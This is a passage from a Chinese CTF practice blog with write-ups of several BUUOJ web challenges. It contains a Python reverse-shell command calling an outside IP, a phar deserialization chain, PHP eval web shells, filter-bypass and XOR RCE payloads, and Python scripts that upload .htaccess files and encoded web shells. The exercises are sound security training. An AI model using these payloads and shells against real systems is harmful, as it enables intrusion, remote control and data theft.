<pre><code>http://e55bfc7a-1b58-4018-8545-2c34946638fc.node4.buuoj.cn:81/no_one_know_the_manager?key=8KI7ZjeLAu178g1JBR9DcCwNsnWdY64XmDWv/PH5qe0=&amp;shell=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22108.166.201.16%22,3333));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330014147414.png" alt="image-20220330014147414"></p>
<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>这题很简单，进去后我们只有50元但是有一个100元的曲奇</p>
<p>猜测购买这个曲奇获得flag</p>
<p>点击购买并抓包</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164344642.png" alt="image-20220330164344642"></p>
<p>seesion很像base64加密</p>
<p>解密一下</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164431797.png" alt="image-20220330164431797"></p>
<p>修改下money然后再base64加密</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164507027.png" alt="image-20220330164507027"></p>
<p>购买100元的曲奇，替换原有的cookie</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164535408.png" alt="image-20220330164535408"></p>
<p>成功获得flag</p>
<h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>点击查看文件</p>
<pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=
</code></pre>
<p>观察url，很可能是文件包含，读取下各个文件源码</p>
<p>index.php</p>
<pre><code class="php">&lt;?php 
header(&quot;content-type:text/html;charset=utf-8&quot;);  
include &#39;base.php&#39;;
?&gt; 
</code></pre>
<p>base.php</p>
<pre><code class="php">&lt;?php 
    session_start(); 
?&gt; 
&lt;!DOCTYPE html&gt; 
&lt;html&gt; 
&lt;head&gt; 
    &lt;meta charset=&quot;utf-8&quot;&gt; 
    &lt;title&gt;web3&lt;/title&gt; 
    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt; 
    &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt; 
    &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; 
&lt;/head&gt; 
&lt;body&gt; 
    &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt; 
        &lt;div class=&quot;container-fluid&quot;&gt; 
        &lt;div class=&quot;navbar-header&quot;&gt; 
            &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt; 
        &lt;/div&gt; 
            &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt; 
                &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt; 
                &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt; 
            &lt;/ul&gt; 
            &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt; 
                &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt; 
            &lt;/ul&gt; 
        &lt;/div&gt; 
    &lt;/nav&gt; 
&lt;/body&gt; 
&lt;/html&gt; 
&lt;!--flag is in f1ag.php--&gt;
</code></pre>
<p>file.php</p>
<pre><code class="php">
首页

    查看文件
    上传文件

    10.244.80.46

&lt;?php 
header(&quot;content-type:text/html;charset=utf-8&quot;);  
include &#39;function.php&#39;; 
include &#39;class.php&#39;; 
ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
$file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; 
if(empty($file)) &#123; 
    echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; 
&#125; 
$show = new Show(); 
if(file_exists($file)) &#123; 
    $show-&gt;source = $file; 
    $show-&gt;_show(); 
&#125; else if (!empty($file))&#123; 
    die(&#39;file doesn\&#39;t exists.&#39;); 
&#125; 
?&gt;  
</code></pre>
<p>upload_file.php</p>
<pre><code class="php">222.90.67.205
&lt;?php 
include &#39;function.php&#39;; 
upload_file(); 
?&gt; 
&lt;html&gt; 
&lt;head&gt; 
&lt;meta charest=&quot;utf-8&quot;&gt; 
&lt;title&gt;文件上传&lt;/title&gt; 
&lt;/head&gt; 
&lt;body&gt; 
&lt;div align = &quot;center&quot;&gt; 
        &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; 
&lt;/div&gt; 
&lt;style&gt; 
    p&#123; margin:0 auto&#125; 
&lt;/style&gt; 
&lt;div&gt; 
&lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; 
    &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt; 
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; 
    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; 
&lt;/div&gt; 

&lt;/script&gt; 
&lt;/body&gt; 
&lt;/html&gt;
</code></pre>
<p>function.php</p>
<pre><code class="php">222.90.67.205
&lt;?php 
//show_source(__FILE__); 
include &quot;base.php&quot;; 
header(&quot;Content-type: text/html;charset=utf-8&quot;); 
error_reporting(0); 
function upload_file_do() &#123; 
    global $_FILES; 
    $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 
    //mkdir(&quot;upload&quot;,0777); 
    if(file_exists(&quot;upload/&quot; . $filename)) &#123; 
        unlink($filename); 
    &#125; 
    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
    echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; 
&#125; 
function upload_file() &#123; 
    global $_FILES; 
    if(upload_file_check()) &#123; 
        upload_file_do(); 
    &#125; 
&#125; 
function upload_file_check() &#123; 
    global $_FILES; 
    $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); 
    $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); 
    $extension = end($temp); 
    if(empty($extension)) &#123; 
        //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; 
    &#125; 
    else&#123; 
        if(in_array($extension,$allowed_types)) &#123; 
            return true; 
        &#125; 
        else &#123; 
            echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;; 
            return false; 
        &#125; 
    &#125; 
&#125; 
?&gt; 
</code></pre>
<p>class.php</p>
<pre><code class="php"> &lt;?php
class C1e4r
&#123;
    public $test;
    public $str;
    public function __construct($name)
    &#123;
        $this-&gt;str = $name;
    &#125;
    public function __destruct()
    &#123;
        $this-&gt;test = $this-&gt;str;
        echo $this-&gt;test;
    &#125;
&#125;

class Show
&#123;
    public $source;
    public $str;
    public function __construct($file)
    &#123;
        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg
        echo $this-&gt;source;
    &#125;
    public function __toString()
    &#123;
        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;
        return $content;
    &#125;
    public function __set($key,$value)
    &#123;
        $this-&gt;$key = $value;
    &#125;
    public function _show()
    &#123;
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;
            die(&#39;hacker!&#39;);
        &#125; else &#123;
            highlight_file($this-&gt;source);
        &#125;
        
    &#125;
    public function __wakeup()
    &#123;
        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;
            echo &quot;hacker~&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        &#125;
    &#125;
&#125;
class Test
&#123;
    public $file;
    public $params;
    public function __construct()
    &#123;
        $this-&gt;params = array();
    &#125;
    public function __get($key)
    &#123;
        return $this-&gt;get($key);
    &#125;
    public function get($key)
    &#123;
        if(isset($this-&gt;params[$key])) &#123;
            $value = $this-&gt;params[$key];
        &#125; else &#123;
            $value = &quot;index.php&quot;;
        &#125;
        return $this-&gt;file_get($value);
    &#125;
    public function file_get($value)
    &#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &#125;
&#125;
?&gt; 
</code></pre>
<p>我们是无法利用文件读取来读取flag的。class.php一看就是反序列化，但是所有的代码里面都没有unserialize方法。有文件上传点，且phar协议没有过滤，那么就应该考察的是利用phar协议来进行反序列化逃逸，那我们就要尝试来构造poc链。</p>
<p>首先确定终点，它应该是可以读取文件的一个方法，我们锁定file_get方法</p>
<pre><code>$text = base64_encode(file_get_contents($value));
</code></pre>
<p>我们就可以向这个方法中传入我们需要读取的文件路径就可以了。</p>
<p>思路:</p>
<pre><code>对象销毁，调用__destruct()方法，最后会echo一个值，令$C1e4r-&gt;str=$Show,这样就会调用show对象的__toString()方法，再令$Show-&gt;str[&#39;str&#39;]=$Test,test对象中并没有source，所以会调用get方法，令Test-&gt;params[source] = &quot;/var/www/html/f1ag.php&quot;,就可以成功读取flag
</code></pre>
<p>poc链</p>
<pre><code class="php">&lt;?php
class C1e4r
&#123;
    public $test;
    public $str;
&#125;
class Show
&#123;
    public $source;
    public $str;
    public function __toString()
    &#123;
        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;
        return $content;
    &#125;
&#125;
class Test
&#123;
    public $file;
    public $params;
&#125;
$c1e4r = new C1e4r();
$show = new Show();
$test = new Test();
$c1e4r-&gt;str = $show;
$show-&gt;str[&#39;str&#39;]=$test;
$test-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;

$phar = new Phar(&quot;sakura.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
$phar-&gt;setMetadata($c1e4r);
$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
$phar-&gt;stopBuffering();
?&gt;
</code></pre>
<p>在本地搭建php环境，然后访问，会生成一个phar文件</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214617285.png" alt="image-20220330214617285"></p>
<p>接下来要把这个文件上传到目标服务器，但是只允许图片进行上传</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214739536.png" alt="image-20220330214739536"></p>
<p>所以我们把后缀改为.gif，这并不会影响phar文件的解析</p>
<p>接下来要得到我们上传文件的路径</p>
<pre><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; 

move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); 
</code></pre>
<p>对文件名和远程地址进行md5加密，后缀加上jpg，由此得到文件名</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220208000.png" alt="image-20220330220208000"></p>
<pre><code>0b0c73463194f72e78079b81d921c8f4.jpg
路径为:xxx/upload/0b0c73463194f72e78079b81d921c8f4.jpg
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220359594.png" alt="image-20220330220359594"></p>
<p>payload</p>
<pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=phar://upload/0b0c73463194f72e78079b81d921c8f4.jpg
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220521789.png" alt="image-20220330220521789"></p>
<p>解密一下</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220555486.png" alt="image-20220330220555486"></p>
<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>简单文件上传，进去后注册账号，登录。</p>
<p>可以直接上传PHP文件</p>
<p>ma.php</p>
<pre><code>GIF89a
&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;x&#39;]);&lt;/script&gt;
</code></pre>
<p>然后复制图片链接，到蚁剑中连接</p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141935935.png" alt="image-20220331141935935"></p>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141947473.png" alt="image-20220331141947473"></p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331142206699.png" alt="image-20220331142206699"></p>
<p>查看源代码</p>
<pre><code class="php"> &lt;?php
error_reporting(0);

if (isset($_GET[&#39;source&#39;])) &#123;
  show_source(__FILE__);
  exit();
&#125;

function is_valid($str) &#123;
  $banword = [
    // no path traversal
    &#39;\.\.&#39;,
    // no stream wrapper
    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,
    // no data exfiltration
    &#39;flag&#39;
  ];
  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;
  if (preg_match($regexp, $str)) &#123;
    return false;
  &#125;
  return true;
&#125;

$body = file_get_contents(&#39;php://input&#39;); #body获取post数据,后面会对这进行
$json = json_decode($body, true); #对获取得数据进行解码

if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123; #判断body是否有效，是否存在json数据，是否存在json[&#39;page&#39;]数据
   $page = $json[&#39;page&#39;];
  $content = file_get_contents($page); #读取page中得内容
  if (!$content || !is_valid($content)) &#123;
    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;
  &#125;
&#125; else &#123;
  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;
&#125;

// no data exfiltration!!!
$content = preg_replace(&#39;/HarekazeCTF\&#123;.+\&#125;/i&#39;, &#39;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#39;, $content);#匹配过滤关键字ctf
echo json_encode([&#39;content&#39; =&gt; $content]); #将content进行json编码并输出
</code></pre>
<p>在json中，字符Unicode编码之后等同于该字符，比如php等同于\u0070\u0068\u0070。</p>
<p>构造payload</p>
<pre><code>php://filter/read=convert.base64-encode/resource=/flag
</code></pre>
<p>编码下</p>
<pre><code>\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331161734671.png" alt="image-20220331161734671"></p>
<p>解码</p>
<pre><code>flag&#123;06495870-7a10-4628-b799-e860b1b58477&#125;
</code></pre>
<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre><code class="php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
function check($input)&#123;
    if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;
        // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;
        die(&#39;hacker!!!&#39;);
    &#125;else&#123;
        return $input;
    &#125;
&#125;

function waf($input)&#123;
  if(is_array($input))&#123;
      foreach($input as $key=&gt;$output)&#123;
          $input[$key] = waf($output);
      &#125;
  &#125;else&#123;
      $input = check($input);
  &#125;
&#125;

$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;
if(!file_exists($dir))&#123;
    mkdir($dir);
&#125;
switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;
    case &#39;pwd&#39;:
        echo $dir;
        break;
    case &#39;upload&#39;:
        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;
        waf($data);
        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);
&#125;
?&gt;
</code></pre>
<p>代码审计</p>
<p><code>$a ?? 0 等同于 isset($a) ? $a : 0。</code></p>
<p>首先爆出路径</p>
<pre><code class="php">http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=pwd
/sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331214929182.png" alt="image-20220331214929182"></p>
<p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p>
<p>其中过滤了php这个关键词，但是这个可以进行绕过</p>
<pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;
大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。
</code></pre>
<pre><code>过滤了空格‘ ’可以用 \t或者%09(需要php环境) 代替
</code></pre>
<p>构造payload</p>
<pre><code>http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=upload&amp;data=&lt;?=%09`cat%09/*`?&gt;
</code></pre>
<p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331225308163.png" alt="image-20220331225308163"></p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre><code class="php">&lt;?php
function get_the_flag()&#123;
    // webadmin will remove your upload file every 20 min!!!! 
    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
    if(!file_exists($userdir))&#123;
    mkdir($userdir);
    &#125;
    if(!empty($_FILES[&quot;file&quot;]))&#123;
        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];
        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];
        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);
    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;); 
        if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);
    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;); 
        $path= $userdir.&quot;/&quot;.$name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    &#125;
&#125;

$hhh = @$_GET[&#39;_&#39;];

if (!$hhh)&#123;
    highlight_file(__FILE__);
&#125;

if(strlen($hhh)&gt;18)&#123;
    die(&#39;One inch long, one inch strong!&#39;);
&#125;

if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )
    die(&#39;Try something else!&#39;);

$character_type = count_chars($hhh, 3);
if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);

eval($hhh);
?&gt;
</code></pre>
<p>代码审计</p>
<p>源码贴上来：</p>
<p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150538110.png" alt="image-20220210150538110"></a></p>
<p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p>
<p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p>
<p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150849473.png" alt="image-20220210150849473"></a></p>
<p>由此判断，这是无字母无数字rce，有三个思路</p>
<p>1、异或</p>
<p>2、取反</p>
<p>3、自增</p>
<p>由于这里对字符的长度有限制</p>
<p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150949879.png" alt="image-20220210150949879"></a></p>
<p>故采用异或。</p>
<p>这里贴上大神的脚本</p>
<pre><code>&lt;?php
function finds($string)&#123;
    $index = 0;
    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];
    for($i=27;$i&lt;count($a);$i++)&#123;
        for($j=27;$j&lt;count($a);$j++)&#123;
            $x = $a[$i] ^ $a[$j];
            for($k = 0;$k&lt;strlen($string);$k++)&#123;
                if(ord($string[$k]) == $x)&#123;
                    echo $string[$k].&quot;\n&quot;;
                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;
                    $index++;
                    if($index == strlen($string))&#123;
                        return 0;
                    &#125;
                &#125;
            &#125;
        &#125;
    &#125;
&#125;
finds(&quot;_GET&quot;);
?&gt;
</code></pre>
<p>运行如图</p>
<p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210151113658.png" alt="image-20220210151113658"></a></p>
<p>由此我们可构造payload：</p>
<pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=phpinfo
```

[![image-20220210152555350](ctf刷题-第一周题目/image-20220210152555350.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png)

成功出来phpinfo，看一看有没有可以利用的点

[![image-20220210152650640](ctf刷题-第一周题目/image-20220210152650640.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png)

发现执行系统的命令全被禁用了，看来rce走不通了。

这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了

[![image-20220210152821670](ctf刷题-第一周题目/image-20220210152821670.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png)

不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。

既然rce走不通，那就试一试文件上传吧

[![image-20220210152933281](ctf刷题-第一周题目/image-20220210152933281.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png)

各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。

但是上传.htaccess仍然有[![image-20220210204915083](ctf刷题-第一周题目/image-20220210204915083.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png)

这个函数限制。

解决这个函数，采用xbm格式，X Bit Map

```
在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图
XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：
#define test_width 16
#define test_height 7
static char test_bits[] = &#123;
0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,
0x00, 0x60 &#125;;
```

在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。

所以我们在.htaccess里加上

```
#define width 1337
#define height 1337
.....
.....
```

就可以绕过绕过这个函数了。

上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对<?进行了检测。

这里有两种方法可以绕过。

1、对一句话木马的内容进行base64编码。

2、使用 utf-16be 来绕过

下面先附上两种方法的exp：

1、

```
import requests
import base64

htaccess = b"""
#define width 1337
#define height 1337 
AddType application/x-httpd-php .ahhh
php_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh"
"""
shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")
#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范
url = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=get_the_flag"

files = &#123;'file':('.htaccess',htaccess,'image/jpeg')&#125;
data = &#123;"upload":"Submit"&#125;
response = requests.post(url=url, data=data, files=files)
print(response.text)

files = &#123;'file':('shell.ahhh',shell,'image/jpeg')&#125;
response = requests.post(url=url, data=data, files=files)
print(response.text)
```

本题php环境为7.2，所以无法使用`<script language="php">eval($_REQUEST['shell']);</script>`这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。

得到

[![image-20220210212049717](ctf刷题-第一周题目/image-20220210212049717.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png)

2、

```
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
    phpfile = open(filename, 'wb') 

    phpfile.write(script.encode('utf-16be'))
    phpfile.write(SIZE_HEADER)

    phpfile.close()

def generate_htacess():
    htaccess = open('.htaccess', 'wb')

    htaccess.write(SIZE_HEADER)
    htaccess.write(b'AddType application/x-httpd-php .lethe\n')
    htaccess.write(b'php_value zend.multibyte 1\n')
    htaccess.write(b'php_value zend.detect_unicode 1\n')
    htaccess.write(b'php_value display_errors 1\n')

    htaccess.close()
        
generate_htacess()

generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")
```

同理上传即可

[![image-20220210212639842](ctf刷题-第一周题目/image-20220210212639842.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png)

一句话木马成功利用。

使用蚁剑成功连接

[![image-20220210212824536](ctf刷题-第一周题目/image-20220210212824536.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png)

但是无法访问根目录。

非预期解：

采用蚁剑自带插件进行绕过.

[![image-20220210213427872](ctf刷题-第一周题目/image-20220210213427872.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png)

预期解：

绕过open_basedir

